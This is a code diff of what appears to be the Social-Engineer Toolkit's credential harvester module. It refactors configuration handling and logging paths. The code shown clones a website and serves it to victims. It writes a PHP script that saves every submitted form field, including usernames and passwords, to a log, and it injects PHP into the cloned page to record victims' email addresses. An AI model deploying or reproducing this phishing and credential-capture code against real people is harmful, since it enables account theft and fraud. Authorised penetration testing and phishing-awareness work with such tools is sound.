@@ -21,13 +21,14 @@ sys.path.append(definepath)
 
 from src.core.setcore import *
 
-apache_check = check_config("APACHE_SERVER=").lower()
-webattack_email = check_config("WEBATTACK_EMAIL=").lower()
-track_email = check_config("TRACK_EMAIL_ADDRESSES=").lower()
+from config.set_config import APACHE_SERVER as apache_check
+from config.set_config import WEBATTACK_EMAIL as webattack_email
+from config.set_config import TRACK_EMAIL_ADDRESSES as track_email
+from config.set_config import HARVESTER_LOG as logpath
 
-if track_email == "on":
+if track_email == True:
     print_status("You have selected to track user accounts, Apache will automatically be turned on to handle tracking of users.")
-    apache_check = "on"
+    apache_check = True
 # detect openssl module
 try:
     from OpenSSL import SSL
@@ -63,14 +64,16 @@ The best way to use this attack is if username and password form
 fields are available. Regardless, this captures all POSTs on a website.""" + bcolors.ENDC
 # see if we're tabnabbing or multiattack
 
-# START WEB SERVER STUFF HERE
-# scrape cloned website
-sys.path.append("src/harvester/")
-debug_msg(me,"importing 'src.webattack.harvester.scraper'",1)
-try: reload(scraper)
-except: import scraper
-
 homepath=os.getcwd()
+
+# remove old files if there
+if os.path.isfile(setdir + "/web_clone/index.html.bak"):
+    os.remove(setdir + "/web_clone/index.html")
+    shutil.copyfile(setdir + "/web_clone/index.html.bak", setdir + "/web_clone/index.html")
+
+# pull scraper
+try: reload(src.webattack.harvester.scraper)
+except: import src.webattack.harvester.scraper
 
 # GRAB DEFAULT PORT FOR WEB SERVER AND CHECK FOR COMMAND CENTER
 command_center="off"
@@ -336,8 +339,8 @@ class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
 
 def run():
 
-    # check if we are running apache mode
-    if apache_check == "off":
+    # check if we are not running apache mode
+    if apache_check == False:
         try:
             server = ThreadedHTTPServer(('', int(web_port)), SETHandler)
             server.serve_forever()
@@ -353,8 +356,6 @@ def run():
             if attack_vector != 'multiattack':
                 try: reload(src.webattack.harvester.report_generator)
                 except: import src.webattack.harvester.report_generator
-                #sys.path.append("src/harvester")
-                #import report_generator
             if attack_vector != 'multiattack':
                 return_continue()
             os.chdir(homepath)
@@ -377,7 +378,7 @@ def run():
                 # check if we are running apache mode
                 print_status("Successfully stopped Apache. Starting the credential harvester.")
                 print_status("Harvester is ready, have victim browse to your site.")
-                if apache_check == "off":
+                if apache_check == False:
                     try:
 
                         try:
@@ -410,7 +411,7 @@ def run():
 
     # if we are using apache, then use the harvester php type that writes it out to post.php
     # note just change the index.html to post somewhere else and rename the post.php to something else
-    if apache_check == "on":
+    if apache_check == True:
 
         try:
             ipaddr=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -424,21 +425,25 @@ def run():
                 if apache_start == "y":
                     subprocess.Popen("/etc/init.d/apache2 start", shell=True).wait()
 
+        try:
 
-        apache_dir = check_config("APACHE_DIRECTORY=")
-        print bcolors.GREEN + "Apache webserver is set to ON. Copying over PHP file to the website."
+            apache_dir = check_config("APACHE_DIRECTORY=")
+            print bcolors.GREEN + "Apache webserver is set to ON. Copying over PHP file to the website."
+        except Exception, e:
+                print e 
+                pause = raw_input("TEST")
         print "Please note that all output from the harvester will be found under apache_dir/harvester_date.txt"
         print "Feel free to customize post.php in the %s directory" % (apache_dir) + bcolors.ENDC
         filewrite = file("%s/post.php" % (apache_dir), "w")
         now=datetime.datetime.today()
         filewrite.write("""<?php $file = 'harvester_%s.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?>""" % (now))
         filewrite.close()
-        filewrite = file("%s/harvester_%s.txt" % (apache_dir,now), "w")
+        filewrite = file("%s/harvester_%s.txt" % (logpath,now), "w")
         filewrite.write("")
         filewrite.close()
-        subprocess.Popen("chown www-data:www-data '%s/harvester_%s.txt'" % (apache_dir,now), shell=True).wait()
+        subprocess.Popen("chown www-data:www-data '%s/harvester_%s.txt'" % (logpath,now), shell=True).wait()
         # here we specify if we are tracking users and such
-        if track_email.lower() == "on":
+        if track_email == True:
             fileopen = file (setdir + "/web_clone/index.html", "r")
             data = fileopen.read()
             data = data.replace("<body>", """<body><?php $file = 'harvester_%s.txt'; $queryString = ''; foreach ($_GET as $key => $value) { $queryString .= $key . '=' . $value . '&';}$query_string = base64_decode($queryString);file_put_contents($file, print_r("Email address recorded: " . $query_string . "\\n", true), FILE_APPEND);?>""" % (now))
@@ -447,16 +452,14 @@ def run():
             filewrite.close()
             os.remove(setdir + "/web_clone/index.html")
             shutil.copyfile(setdir + "/web_clone/index.2", setdir + "/web_clone/index.html")
-
         if os.path.isfile("%s/index.html" % (apache_dir)):
             os.remove("%s/index.html" % (apache_dir))
-        if track_email.lower() == "off":
+        if track_email == False:
             shutil.copyfile(setdir + "/web_clone/index.html", "%s/index.html" % (apache_dir))
-        if track_email.lower() == "on":
+        if track_email == True:
             shutil.copyfile(setdir + "/web_clone/index.html", "%s/index.php" % (apache_dir))
             print_status("NOTE: The URL to click on is index.php NOT index.html with track emails.")
         print_status("All files have been copied to %s" % (apache_dir))
-
         if attack_vector != 'multiattack':
             pause = raw_input("{Press return to continue}")
 
@@ -486,9 +489,9 @@ def ssl_server(HandlerClass = SETHandler,ServerClass = SecureHTTPServer):
     httpd = ServerClass(server_address, HandlerClass)
     # serve the httpd server until exit
     httpd.serve_forever()
-if track_email == "on": webattack_email = "on"
+if track_email == True: webattack_email = True
 # if emailer webattack, spawn email questions
-if webattack_email == "on":
+if webattack_email == True:
     try:
         import src.phishing.smtp.client.smtp_web
     except Exception, e:
@@ -515,15 +518,17 @@ if ssl_flag == 'true':
     subprocess.Popen("cp %s/*.pem %s/web_clone/" % (setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
 # head over to cloned dir
-os.chdir(setdir + "/web_clone/")
+if apache_check == False:
+    os.chdir(setdir + "/web_clone/")
 
 if attack_vector != "multiattack":
-    if apache_check == "OFF" or apache_check == "off":
+    if apache_check == False:
         print bcolors.BLUE+"[*] The Social-Engineer Toolkit Credential Harvester Attack\r\n[*] Credential Harvester is running on port "+web_port+"\r"
         print "[*] Information will be displayed to you as it arrives below:\r" + bcolors.ENDC
     else:
         print bcolors.BLUE+"[*] Apache is set to ON - everything will be placed in your web root directory of apache."
         print bcolors.BLUE+"[*] Files will be written out to the root directory of apache."
+        print bcolors.BLUE+"[*] ALL files are within your Apache directory since you specified it to ON."
 
 # catch all
 try:
